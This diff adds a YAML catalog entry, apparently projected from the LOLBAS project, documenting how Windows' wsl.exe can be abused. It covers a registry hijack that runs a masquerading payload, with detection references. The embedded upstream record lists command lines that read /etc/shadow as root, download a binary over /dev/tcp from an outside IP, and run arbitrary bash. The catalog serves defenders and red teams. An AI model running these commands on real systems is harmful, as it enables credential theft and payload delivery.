@@ -1,0 +1,117 @@
+id: lolbas/T3RoZXJNU0JpbmFyaWVzL1dzbC55bWw/RXhlY3V0ZQ/4
+type: binary
+platform: windows
+name: Wsl.exe
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1218
+opsec:
+  noise: high
+  triggers: Child process from wsl.exe
+  detection_refs:
+  - https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wsl_lolbin_execution.yml
+commands:
+- template: wsl.exe
+  comment: When executed, `wsl.exe` queries the registry value of `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\InstallLocation`,
+    which contains a folder path (`c:\program files\wsl` by default). If the value points to another folder
+    containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe` in the
+    program files folder.
+references:
+- https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: Wsl.exe
+      category: Execute
+      privileges: User
+      mitre_id: T1218
+      source_file: OtherMSBinaries/Wsl.yml
+      command_source_index: 4
+      document_utf8: "---\nName: Wsl.exe\nDescription: Windows subsystem for Linux executable\nAuthor:\
+        \ Matthew Brown\nCreated: 2019-06-27\nCommands:\n  - Command: wsl.exe -e /mnt/c/Windows/System32/calc.exe\n\
+        \    Description: Executes calc.exe from wsl.exe\n    Usecase: Performs execution of specified\
+        \ file, can be used to execute arbitrary Linux commands.\n    Category: Execute\n    Privileges:\
+        \ User\n    MitreID: T1202\n    OperatingSystem: Windows 10, Windows Server 2019, Windows 11\n\
+        \    Tags:\n      - Execute: EXE\n  - Command: wsl.exe -u root -e cat /etc/shadow\n    Description:\
+        \ Cats /etc/shadow file as root\n    Usecase: Performs execution of arbitrary Linux commands as\
+        \ root without need for password.\n    Category: Execute\n    Privileges: User\n    MitreID: T1202\n\
+        \    OperatingSystem: Windows 10, Windows Server 2019, Windows 11\n    Tags:\n      - Execute:\
+        \ CMD\n  - Command: wsl.exe --exec bash -c \"{CMD}\"\n    Description: Executes Linux command\
+        \ (for example via bash) as the default user (unless stated otherwise using `-u <username>`) on\
+        \ the default WSL distro (unless stated otherwise using `-d <distro name>`)\n    Usecase: Performs\
+        \ execution of arbitrary Linux commands.\n    Category: Execute\n    Privileges: User\n    MitreID:\
+        \ T1202\n    OperatingSystem: Windows 10, Windows Server 2019, Windows 11\n    Tags:\n      -\
+        \ Execute: CMD\n  - Command: wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'\n\
+        \    Description: Downloads file from 192.168.1.10\n    Usecase: Download file\n    Category:\
+        \ Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows 10, Windows\
+        \ Server 2019, Windows 11\n  - Command: wsl.exe\n    Description: When executed, `wsl.exe` queries\
+        \ the registry value of `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Lxss\\MSI\\InstallLocation`,\
+        \ which contains a folder path (`c:\\program files\\wsl` by default). If the value points to another\
+        \ folder containing a file named `wsl.exe`, it will be executed instead of the legitimate `wsl.exe`\
+        \ in the program files folder.\n    Usecase: Execute a payload as a child process of `bash.exe`\
+        \ while masquerading as WSL.\n    Category: Execute\n    Privileges: User\n    MitreID: T1218\n\
+        \    OperatingSystem: Windows 10, Windows Server 2019, Windows 11\n    Tags:\n      - Execute:\
+        \ CMD\nFull_Path:\n  - Path: C:\\Windows\\System32\\wsl.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wsl_lolbin_execution.yml\n\
+        \  - BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\n\
+        \  - IOC: Child process from wsl.exe\nResources:\n  - Link: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\n\
+        \  - Link: https://twitter.com/nas_bench/status/1535431474429808642\n  - Link: https://cardinalops.com/blog/bash-and-switch-hijacking-via-windows-subsystem-for-linux/\n\
+        Acknowledgement:\n  - Person: Alex Ionescu\n    Handle: '@aionescu'\n  - Person: Matt\n    Handle:\
+        \ '@NotoriousRebel1'\n  - Person: Asif Matadar\n    Handle: '@d1r4c'\n  - Person: Nasreddine Bencherchali\n\
+        \    Handle: '@nas_bench'\n  - Person: Konrad 'unrooted' Klawikowski\n  - Person: Liran Ravich,\
+        \ CardinalOps\n"
+      document_sha256: sha256:93acd7916609c1e1dd6d620ec0b80642f41f7009cce02407139147e596ccf755
+    upstream_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1218
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:36f3f7c4d334cafdf655b2112dcdf236c0a23ba026e7fb99665c5a9a081dbe00
